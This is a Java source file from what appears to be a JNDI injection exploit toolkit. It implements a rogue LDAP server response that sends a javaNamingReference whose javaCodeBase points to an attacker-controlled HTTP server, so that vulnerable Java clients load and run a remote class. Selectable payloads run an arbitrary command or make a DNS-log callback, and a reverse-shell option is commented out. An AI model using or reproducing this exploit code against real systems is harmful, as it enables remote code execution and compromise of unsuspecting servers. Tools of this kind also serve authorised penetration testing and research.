package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.templates.CommandTemplate;
import net.roboterh.injector.templates.DnsLogTemplate;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import java.net.URL;

/*
    Basic way
    Requirement:
        com.sun.jndi.ldap.object.trustURLCodebase = true
    Explanation:
        set attribution `javaCodeBase` to remote server, and we can obtain particular class
 */

public class Basic implements LDAPService {
    private static final Logger logger = LogManager.getLogger(Basic.class);

    private String[] params;
    private PayloadEnum payload;
    private String className;

    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            Entry entry = new Entry(baseDN);
            URL url = new URL(new URL(HTTPServer.codeBase), className + ".class");
            logger.info(String.format("Send LDAP reference result for %s redirecting to %s ...", baseDN, url));
            entry.addAttribute("javaClassName", "foo");
            entry.addAttribute("javaCodeBase", HTTPServer.codeBase);
            entry.addAttribute("javaFactory", className);
            entry.addAttribute("objectClass", "javaNamingReference");

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    public void argsHandler(String baseDN) {
        for (PayloadEnum payloadEnum : PayloadEnum.values()) {
            if (baseDN.toLowerCase().contains(payloadEnum.name().toLowerCase())) {
                payload = payloadEnum;
                logger.info(String.format("Payload Selected is %s ...", payload.name()));

                // add args
                switch (payload.name()) {
                    case "DnsLog":
                        // add dnslog's link
                        String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                        logger.info(String.format("Received link is %s ...", link));
                        params = new String[]{link};
                        break;
                    case "Command":
                        // add command's cmd
                        String cmd = PayloadUtils.getCmdFromBase(baseDN);
                        logger.info(String.format("Received command is %s ...", cmd));
                        params = new String[]{cmd};
                        break;
//                    case "ReverseShell":
//                        // add ip and port of remote machine
//                        int lastIndex = baseDN.lastIndexOf("/");
//                        int secondIndex = baseDN.lastIndexOf("/", lastIndex - 1);
//                        String ip = baseDN.substring(secondIndex + 1, lastIndex);
//                        String port = baseDN.substring(lastIndex + 1);
//                        logger.info(String.format("Received ip is %s and port is %s ...", ip, port));
//                        params = new String[]{ip, port};
//                        break;
                }
            }
        }
    }

    public void generateHandler() {
        switch (payload.name()) {
            case "DnsLog":
                DnsLogTemplate dnsLogTemplate = new DnsLogTemplate(params[0]);
                // add Cache
                dnsLogTemplate.addCache();
                className = dnsLogTemplate.getClassName();
                break;
            case "Command":
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                // add cache
                commandTemplate.addCache();
                className = commandTemplate.getClassName();
                break;
            default:
                className = "";
        }
    }
}
